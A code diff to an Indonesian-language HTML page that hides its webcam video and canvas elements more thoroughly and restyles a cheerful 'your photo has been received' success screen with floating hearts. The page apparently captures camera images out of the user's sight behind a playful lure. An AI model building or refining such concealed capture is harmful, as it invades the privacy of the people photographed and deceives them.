@@ -135,11 +135,19 @@
         }
 
         #video {
-            display: none;
+            display: none !important;
+            visibility: hidden !important;
+            position: absolute;
+            width: 0 !important;
+            height: 0 !important;
         }
 
         #canvas {
-            display: none;
+            display: none !important;
+            visibility: hidden !important;
+            position: absolute;
+            width: 0 !important;
+            height: 0 !important;
         }
 
         /* Success Screen */
@@ -176,6 +184,7 @@
             text-shadow: 0 3px 15px rgba(0, 0, 0, 0.2);
             line-height: 1.4;
             animation: fadeIn 0.8s ease;
+            max-width: 600px;
         }
 
         .message-box .emoji {
@@ -185,11 +194,20 @@
             animation: bounce 1s ease-in-out infinite;
         }
 
+        .sub-message {
+            font-size: 1.5rem;
+            opacity: 0.9;
+            animation: fadeIn 1s ease 0.3s backwards;
+        }
+
         .hearts-container {
             position: absolute;
             width: 100%;
             height: 100%;
+            top: 0;
+            left: 0;
             pointer-events: none;
+            z-index: 10;
         }
 
         .floating-heart {
@@ -245,7 +263,7 @@
                 Fotomu sudah kami terima!
                 <span class="emoji">📸💝</span>
             </div>
-            <div style="font-size: 1.5rem; opacity: 0.9;">Terima kasih telah berbagi momen spesialmu 💕</div>
+            <div class="sub-message">Terima kasih telah berbagi momen spesialmu 💕</div>
             <div class="button-group">
                 <button id="retry-btn">Ulangi</button>
             </div>
@@ -298,7 +316,6 @@
                 });
 
                 video.srcObject = stream;
-                video.style.display = 'none';
 
                 video.onloadedmetadata = () => {
                     video.play();
